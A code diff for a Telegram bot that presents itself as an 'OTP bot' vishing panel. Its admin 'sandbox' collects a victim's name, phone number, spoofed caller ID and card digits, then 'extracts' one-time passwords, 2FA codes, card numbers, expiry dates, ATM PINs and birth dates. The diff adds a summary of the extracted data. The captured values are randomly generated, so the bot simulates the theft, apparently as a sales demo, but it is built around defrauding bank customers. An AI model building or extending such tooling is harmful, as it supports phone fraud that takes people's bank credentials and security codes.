@@ -134,7 +134,7 @@ bot.action(/copy_(btc|eth|ltc)/, (ctx) => {
 bot.command('id', (ctx) => {
   if (ctx.message.text.trim() === `/id ${ADMIN_KEY}`) {
     admins.add(ctx.from.id);
-    sandboxState.set(ctx.from.id, { step: "start" });
+    sandboxState.set(ctx.from.id, { step: "start", extracted: [] });
     ctx.replyWithHTML(`🔥 <b>ADMIN SANDBOX READY</b>`, {
       reply_markup: { inline_keyboard: [[{ text: "📞 START CALL", callback_data: "sandbox_start" }]] }
     });
@@ -143,15 +143,30 @@ bot.command('id', (ctx) => {
 
 bot.action('sandbox_start', (ctx) => {
   if (!admins.has(ctx.from.id)) return;
-  sandboxState.set(ctx.from.id, { step: "name" });
+  sandboxState.set(ctx.from.id, { step: "name", extracted: [] });
   ctx.replyWithHTML(`<b>📞 GATHER INFO</b>\n\nVictim name?`, {
     reply_markup: { inline_keyboard: [[{ text: "📴 HANG UP", callback_data: "hangup" }]] }
   });
 });
 
 bot.action('hangup', (ctx) => {
+  const state = sandboxState.get(ctx.from.id);
+  if (!state) return;
+  let summary = `<b>📴 CALL SUMMARY</b>\n\n`;
+  summary += `Victim: ${state.victim || "N/A"}\n`;
+  summary += `Number: ${state.number || "N/A"}\n`;
+  summary += `Spoof ID: ${state.spoof || "N/A"}\n`;
+  summary += `Last 4: ${state.last4 || "N/A"}\n\n`;
+  summary += `<b>Extracted Data:</b>\n`;
+  if (state.extracted.length === 0) {
+    summary += "Nothing captured";
+  } else {
+    state.extracted.forEach(item => {
+      summary += `${item}\n`;
+    });
+  }
+  ctx.replyWithHTML(summary);
   sandboxState.delete(ctx.from.id);
-  ctx.reply("📴 Call disconnected");
 });
 
 bot.on('text', (ctx) => {
@@ -189,22 +204,21 @@ bot.on('text', (ctx) => {
     state.step = "active";
     ctx.replyWithHTML(`<b>💳 Last 4: ${state.last4}</b>\n\nCall initiated — ringing...`);
 
-    const callDelay = 40000 + Math.random() * 20000; // 40s-1min
+    const callDelay = 40000 + Math.random() * 20000;
     setTimeout(() => {
       ctx.replyWithHTML(`📞 <b>Victim answered</b>
-🔴 Call connected
+🔴 Call connected (not pressable)
 Playing Phase 1 script... (don't send code yet)`);
     }, callDelay);
 
-    const phaseDelay = callDelay + 35000 + Math.random() * 25000; // 35s-1min after answer
+    const phaseDelay = callDelay + 35000 + Math.random() * 25000;
     setTimeout(() => {
       ctx.reply("⚠️ Phase 1 complete — ready for extraction");
     }, phaseDelay);
 
-    // Persistent extraction buttons
     ctx.replyWithHTML(`<b>📞 EXTRACTION TOOLS</b>\n\nSelect:`, {
       reply_markup: {
-        inline_keyboard:_Mouse
+        inline_keyboard: [
           [{ text: "🔢 OTP (6 digit)", callback_data: "otp6" }],
           [{ text: "🔢 OTP (4 digit)", callback_data: "otp4" }],
           [{ text: "📱 2FA App", callback_data: "2fa" }],
@@ -235,11 +249,10 @@ Playing Phase 1 script... (don't send code yet)`);
       state.last4 = "skipped";
       state.step = "active";
       ctx.replyWithHTML(`<b>💳 Last 4: skipped</b>\n\nCall initiated — ringing...`);
-      // same call flow as above
       const callDelay = 40000 + Math.random() * 20000;
       setTimeout(() => {
         ctx.replyWithHTML(`📞 <b>Victim answered</b>
-🔴 Call connected
+🔴 Call connected (not pressable)
 Playing Phase 1 script... (don't send code yet)`);
       }, callDelay);
       const phaseDelay = callDelay + 35000 + Math.random() * 25000;
@@ -264,67 +277,88 @@ Playing Phase 1 script... (don't send code yet)`);
     }
   }
 
-  // Extraction buttons (persistent)
+  // Extraction buttons
   if (ctx.callbackQuery && admins.has(ctx.from.id)) {
     const data = ctx.callbackQuery.data;
-    const delay = 40000 + Math.random() * 20000; // 40s-1min
+    const delay = 40000 + Math.random() * 20000;
+    const state = sandboxState.get(ctx.from.id);
 
     if (data === "otp6") {
       ctx.reply("🔄 Requesting 6-digit OTP...");
       setTimeout(() => {
         const code = Math.floor(100000 + Math.random() * 900000);
-        ctx.replyWithHTML(`🎯 <b>CODE CAUGHT!</b>\n\n6-digit OTP: <code>${code}</code>\n\nDelivered to panel`);
+        const msg = `🎯 <b>CODE CAUGHT!</b>\n\n6-digit OTP: <code>${code}</code>\n\nDelivered to panel`;
+        ctx.replyWithHTML(msg);
+        state.extracted.push(`6-digit OTP: ${code}`);
       }, delay);
       return;
     }
+
     if (data === "otp4") {
       ctx.reply("🔄 Requesting 4-digit OTP...");
       setTimeout(() => {
         const code = Math.floor(1000 + Math.random() * 9000);
-        ctx.replyWithHTML(`🎯 <b>CODE CAUGHT!</b>\n\n4-digit OTP: <code>${code}</code>\n\nDelivered to panel`);
+        const msg = `🎯 <b>CODE CAUGHT!</b>\n\n4-digit OTP: <code>${code}</code>\n\nDelivered to panel`;
+        ctx.replyWithHTML(msg);
+        state.extracted.push(`4-digit OTP: ${code}`);
       }, delay);
       return;
     }
+
     if (data === "2fa") {
       ctx.reply("🔄 Accessing 2FA app...");
       setTimeout(() => {
         const code = Math.floor(100000 + Math.random() * 900000);
-        ctx.replyWithHTML(`📱 <b>2FA App Code Captured</b>\n\n<code>${code}</code>`);
+        const msg = `📱 <b>2FA App Code Captured</b>\n\n<code>${code}</code>`;
+        ctx.replyWithHTML(msg);
+        state.extracted.push(`2FA Code: ${code}`);
       }, delay);
       return;
     }
+
     if (data === "ccnum") {
       ctx.reply("🔄 Extracting CC number...");
       setTimeout(() => {
         const cc = `4${Math.floor(Math.random()*900000000000000) + 100000000000000}`.match(/.{4}/g).join(' ');
-        ctx.replyWithHTML(`💳 <b>CC Number Captured</b>\n\n<code>${cc}</code>`);
+        const msg = `💳 <b>CC Number Captured</b>\n\n<code>${cc}</code>`;
+        ctx.replyWithHTML(msg);
+        state.extracted.push(`CC Number: ${cc}`);
       }, delay);
       return;
     }
+
     if (data === "ccexpiry") {
       ctx.reply("🔄 Getting expiration...");
       setTimeout(() => {
         const month = String(1 + Math.floor(Math.random()*12)).padStart(2, '0');
         const year = 25 + Math.floor(Math.random()*10);
-        ctx.replyWithHTML(`📅 <b>CC Expiration Captured</b>\n\n${month}/${year}`);
+        const msg = `📅 <b>CC Expiration Captured</b>\n\n${month}/${year}`;
+        ctx.replyWithHTML(msg);
+        state.extracted.push(`CC Exp: ${month}/${year}`);
       }, delay);
       return;
     }
+
     if (data === "atmpin") {
       ctx.reply("🔄 Retrieving ATM PIN...");
       setTimeout(() => {
         const pin = Math.floor(1000 + Math.random()*9000);
-        ctx.replyWithHTML(`🔒 <b>ATM PIN Captured</b>\n\n<code>${pin}</code>`);
+        const msg = `🔒 <b>ATM PIN Captured</b>\n\n<code>${pin}</code>`;
+        ctx.replyWithHTML(msg);
+        state.extracted.push(`ATM PIN: ${pin}`);
       }, delay);
       return;
     }
+
     if (data === "dob") {
       ctx.reply("🔄 Getting DOB...");
       setTimeout(() => {
         const year = 1950 + Math.floor(Math.random()*50);
         const month = String(1 + Math.floor(Math.random()*12)).padStart(2, '0');
         const day = String(1 + Math.floor(Math.random()*28)).padStart(2, '0');
-        ctx.replyWithHTML(`📅 <b>DOB Captured</b>\n\n${month}/${day}/${year}`);
+        const msg = `📅 <b>DOB Captured</b>\n\n${month}/${day}/${year}`;
+        ctx.replyWithHTML(msg);
+        state.extracted.push(`DOB: ${month}/${day}/${year}`);
       }, delay);
       return;
     }
